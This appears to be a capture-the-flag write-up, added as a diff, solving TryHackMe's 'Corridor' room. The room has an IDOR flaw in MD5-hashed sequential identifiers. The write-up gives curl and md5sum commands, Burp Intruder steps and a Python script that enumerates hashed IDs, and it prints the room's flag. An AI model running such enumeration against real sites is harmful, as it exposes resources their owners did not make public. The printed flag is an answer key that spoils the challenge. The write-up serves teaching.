@@ -1,0 +1,209 @@
+---
+title: 'Corridor'
+description: 'An IDOR on predictable identifiers: MD5 hashes in the URL that, once enumerated, reveal a hidden door and the room flag.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+---
+
+**Difficulty:** Easy (“5 Minute Hacks” category) **Category:** IDOR (Insecure Direct Object Reference), MD5 hash cracking, enumeration of predictable identifiers **Room:** [https://tryhackme.com/room/corridor](https://tryhackme.com/room/corridor)
+
+## Room description
+
+> You find yourself in a strange corridor. Can you find your way back to where you came from?
+
+A very short web challenge (part of TryHackMe’s “5 minute hacks” category) that works as a hands-on introduction to **IDOR (Insecure Direct Object Reference)** vulnerabilities: the web app uses MD5 hashes of small numbers as if they were “safe” identifiers for which “doors”/rooms the user may reach, when they are in fact trivial to recreate.
+
+> **Note on placeholders:** `{IP}` stands for the IP TryHackMe assigns to this machine (it changes on every deploy); in some variants of the room the site also answers on the `corridor.thm` domain once it is added to `/etc/hosts`. The MD5 hashes shown in these notes correspond to the numbers 1 through 12/13 and are always the same (MD5 is deterministic: the same input text always produces the same hash), so they do not vary between deploys.
+
+---
+
+## 1. Initial recon
+
+Visiting `http://{IP}/` (port 80) shows an image of a corridor with several **doors**, each linking to a different URL. Clicking any of them changes the URL to something like:
+
+```
+http://{IP}/c4ca4238a0b923820dcc509a6f75849b
+```
+
+Each “door” leads to an empty room, but the **identifier in the URL** stands out: a 32-character hex string — the characteristic length of an **MD5 hash**.
+
+### 1.1 Review the page source
+
+```
+Ctrl + U (view source in the browser)
+```
+
+Or, equivalently, from the command line:
+
+```bash
+curl -s http://{IP}/ | grep -oE '[a-f0-9]{32}'
+```
+
+The main page’s HTML contains `<area>` tags (clickable image maps), each holding one of these hash values in its `href` attribute. These are exactly the hashes already collected in these notes:
+
+```
+c4ca4238a0b923820dcc509a6f75849b
+c81e728d9d4c2f636f067f89cc14862c
+eccbc87e4b5ce2fe28308fd9f2a7baf3
+a87ff679a2f3e71d9181a67b7542122c
+e4da3b7fbbce2345d7772b0674a318d5
+1679091c5a880faf6fb5e6087eb1b2dc
+8f14e45fceea167a5a36dedd4bea2543
+45c48cce2e2d7fbdea1afc51c7c6ad26
+d3d9446802a44259755d38e6d163e820
+6512bd43d9caa6e02c990b0a82652dca
+c20ad4d76fe97759aa27a0c99bff6710
+c51ce410c124a10e0db5e4b97fc2af39
+```
+
+---
+
+## 2. Spotting the pattern (cracking the hashes)
+
+With 12 distinct hashes and no other visible information, the logical next step is to **crack them** to understand what they represent. You can use an online service like [CrackStation](https://crackstation.net/) or [CyberChef](https://gchq.github.io/CyberChef/) (the “MD5” recipe), or do it locally by comparing against small numbers, since MD5 is a **fast, unsalted** hash function in this context — perfect for trivial brute force over a small numeric range:
+
+```bash
+for i in $(seq 1 20); do
+  echo -n "$i" | md5sum | awk -v n="$i" '{print n": "$1}'
+done
+```
+
+- `echo -n`: it is important to use `-n` so the trailing newline is **not** included in the text before hashing it — if the newline is included, the resulting hash would be different (for example, `echo '1' | md5sum`, without `-n`, gives a different result than `echo -n '1' | md5sum`). This is a common mistake when reproducing MD5 hashes from the terminal.
+
+Comparing the output against the list of hashes on the page confirms that **each hash is the MD5 of its corresponding integer**, from **1 to 12** (or up to 13, depending on the deployed version of the room):
+
+| Hash                               | Number |
+| ---------------------------------- | ------ |
+| `c4ca4238a0b923820dcc509a6f75849b` | 1      |
+| `c81e728d9d4c2f636f067f89cc14862c` | 2      |
+| `eccbc87e4b5ce2fe28308fd9f2a7baf3` | 3      |
+| `a87ff679a2f3e71d9181a67b7542122c` | 4      |
+| `e4da3b7fbbce2345d7772b0674a318d5` | 5      |
+| `1679091c5a880faf6fb5e6087eb1b2dc` | 6      |
+| `8f14e45fceea167a5a36dedd4bea2543` | 7      |
+| `45c48cce2e2d7fbdea1afc51c7c6ad26` | 8      |
+| `d3d9446802a44259755d38e6d163e820` | 9      |
+| `6512bd43d9caa6e02c990b0a82652dca` | 10     |
+| `c20ad4d76fe97759aa27a0c99bff6710` | 11     |
+| `c51ce410c124a10e0db5e4b97fc2af39` | 12     |
+
+Each of these URLs, when visited, shows an empty “room” — that is, the 12 visible doors hold nothing of interest.
+
+---
+
+## 3. Identifying the vulnerability (IDOR)
+
+The fact that each room’s “identifier” is really the **MD5 hash of a sequential, predictable number** is the core of the **IDOR** vulnerability: the app assumes that, because it is “obfuscated” as a hash, the user cannot guess or build identifiers for rooms they should not have direct access to (for example, rooms before 1, or after the last visible one). But since MD5:
+
+1. Is a **deterministic** function (same input → always the same output), and
+2. Involves no secret (there is no “salt” or key added to the numbers before hashing them),
+
+…any attacker can **regenerate** exactly the same hashes for any number they want to try, with no need to brute-force anything against a server: MD5 is not encryption, it is a public, repeatable mathematical operation.
+
+This is a classic example of **“security through obscurity”**: hiding a sequential identifier behind a hash does not make it unpredictable if the input value space (small numbers) is trivial to walk through.
+
+---
+
+## 4. Exploitation: looking for the hidden door
+
+Since the visible identifiers run from 1 to 12/13, the natural question is: **is there a room with a number outside that range, not linked from anywhere visible, but which the server will serve if requested directly?**
+
+### 4.1 Try going up (numbers above the last visible one)
+
+Several public write-ups of the room first try to continue the sequence upward (14, 15, 16…), generating and visiting those hashes, with no luck — the server has no content for those numbers.
+
+### 4.2 Try the value “before the beginning”: 0
+
+The intuition (and the one that turns out to be correct) is that the “hidden” door is not after the last visible door, but **before the first** — that is, the number **`0`**, which is never linked from any interface element.
+
+```bash
+echo -n "0" | md5sum
+# cfcd208495d565ef66e7dff9f98764da
+```
+
+Visit that URL directly:
+
+```bash
+curl -s http://{IP}/cfcd208495d565ef66e7dff9f98764da
+```
+
+Or simply paste the full URL into the browser:
+
+```
+http://{IP}/cfcd208495d565ef66e7dff9f98764da
+```
+
+Unlike the previous 12, this room **does** contain content: the room flag.
+
+---
+
+## 5. Flag
+
+<Flag value="flag{2477ef02448ad9156661ac40a6b8862e}" />
+
+---
+
+## 6. Alternative methods (documented by the community)
+
+Although the manual path described above is the most direct for this particular room, it is worth knowing more systematic approaches, useful when the range of possible values is not so obvious:
+
+### 6.1 Automation with Burp Suite Intruder
+
+1. Intercept a request to any of the known-hash URLs.
+2. Mark the hash part as the payload position (`§...§`).
+3. Set the payload type to a numeric list (for example, from `-10` to `20`).
+4. Add a **Payload Processing** rule of type `Hash → MD5`, so Burp automatically turns each candidate number into its MD5 hash before sending it.
+5. Launch the attack and compare response lengths (`Length`): most responses for “empty” numbers will have a similar length, while the response with the flag stands out by having a different size.
+
+### 6.2 Python script (programmatic brute force)
+
+```python
+import requests
+import hashlib
+import re
+
+url = "http://{IP}/"
+resp = requests.get(url)
+existing_hashes = set(re.findall(r'[a-f0-9]{32}', resp.text))
+
+for i in range(-10, 100):
+    h = hashlib.md5(str(i).encode()).hexdigest()
+    if h in existing_hashes:
+        continue  # We already know this room is empty
+    check = requests.get(url + h)
+    if check.status_code == 200:
+        print(f"[+] Number {i} -> hash {h} -> possible hidden room")
+```
+
+- `hashlib.md5(str(i).encode()).hexdigest()`: generates the MD5 hash of each candidate number, just as we did manually with `md5sum`.
+- The script avoids re-checking hashes we already know are empty (the 12 visible on the main page), optimising the walk.
+- When it finds a room with a `200` response code that was not in the original list, it reports it as a candidate — in this case, that would be the number `0`.
+
+---
+
+## 7. Attack chain summary
+
+1. Visit the site and spot **12 “doors”**, each linking to a URL with a 32-character hex identifier (MD5 format).
+2. **Crack/regenerate** those hashes locally against small numbers (`echo -n "N" | md5sum`), confirming they represent the numbers 1 to 12.
+3. Identify the vulnerability as an **IDOR**: the “obfuscated identifier” is actually trivial to recreate because it depends on no secret.
+4. Try generating the hash of a number **outside the visible range** — specifically `0`, the value “before the start” of the sequence.
+5. Visit that manually generated URL and find a room with real content: the **flag**.
+
+## 8. Lessons learned / key concepts
+
+- **IDOR (Insecure Direct Object Reference)**: occurs when an application exposes direct references to internal resources (files, database records, rooms, etc.) without properly validating whether the current user **should** have access to that specific resource — it is enough to be able to guess or build the right identifier.
+- **Obfuscation ≠ security**: turning a predictable sequential number into an MD5 hash adds no real security if the input value space is small and no secret (key, salt) is involved. The attacker can regenerate the same hashes without “breaking” anything cryptographically.
+- **`echo -n` vs `echo`**: when generating hashes manually from the terminal, one extra newline (`echo` without `-n`) completely changes the resulting hash — a small technical detail, but one that causes a lot of confusion if overlooked.
+- **Thinking “outside the visible range”**: in identifier-enumeration challenges, replicating what is already visible is not enough; the real target is often deliberately excluded from any reference in the interface (here, the value `0`, a natural boundary many developers forget to consider when validating ranges).
+- **Automation with Burp Suite Intruder** (including Payload Processing rules like `Hash → MD5`) is a skill transferable to any scenario where identifiers are hashed but the input value space is enumerable.
+
+## 9. Tools used
+
+Browser (source inspection), `curl`, `md5sum` / CyberChef / CrackStation (cracking and generating MD5 hashes), optionally **Burp Suite** (Intruder) or a **Python** script to automate the search.
+
+---
+
+_Academic write-up, built from my own notes solving the “Corridor” challenge on TryHackMe, supplemented with public community write-ups to reconstruct the full context of the IDOR vulnerability and document alternative automation methods._
